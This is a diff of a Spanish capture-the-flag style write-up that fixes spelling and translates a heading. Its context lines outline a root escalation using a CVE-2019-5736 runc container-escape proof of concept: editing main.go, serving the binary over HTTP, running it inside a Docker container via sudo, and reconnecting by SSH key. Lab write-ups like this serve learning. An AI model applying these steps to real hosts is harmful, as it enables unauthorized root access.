@@ -1,4 +1,4 @@
-## Privilege Escalation {-}
+## Escalada de Privilegios {-}
 
 ### Rootear la maquina {-}
 
@@ -29,7 +29,7 @@ cd CVE-2019-5736-PoC
 vi main.go
 ```
 
-Aqui mirando el `main.go` vemos un commentario que dice:
+Aqui mirando el `main.go` vemos un comentario que dice:
 
 `// This is the line of shell commands that will execute on host`
 
@@ -51,7 +51,7 @@ Ahora lo compilamos y lo transferimos a la maquina victima
     python -m http.server 80
     ```
 
-1. En la maquina victima nos connectamos al contenedor
+1. En la maquina victima nos conectamos al contenedor
 
     ```bash
     sudo /usr/bin/docker exec -it webapp-dev01 bash
@@ -62,7 +62,7 @@ Ahora lo compilamos y lo transferimos a la maquina victima
     ./exploit
     ```
 
-1. No connectamos nuevamente con ssh
+1. No conectamos nuevamente con ssh
 
     ```bash
     ssh -i id_rsa noah@10.10.10.230
